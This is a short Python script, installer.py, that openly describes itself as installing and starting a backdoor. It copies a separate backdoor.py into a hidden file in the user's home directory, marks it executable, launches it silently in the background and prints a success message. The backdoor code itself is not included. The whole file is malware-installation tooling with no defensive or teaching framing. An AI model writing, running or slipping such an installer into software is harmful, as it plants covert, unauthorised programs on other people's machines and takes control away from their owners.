# installer.py - Script to install and start the backdoor

import os
import sys
import subprocess

# Function to install the backdoor
def install_backdoor():
    # Copy the backdoor script to a common directory
    backdoor_path = os.path.join(os.path.expanduser('~'), '.backdoor.py')
    with open(backdoor_path, 'w') as f:
        with open('backdoor.py', 'r') as backdoor_file:
            f.write(backdoor_file.read())

    # Make the backdoor script executable
    os.chmod(backdoor_path, 0o755)

    # Start the backdoor in the background
    subprocess.Popen(['python3', backdoor_path])

if __name__ == "__main__":
    install_backdoor()
    print("Backdoor installed and started.")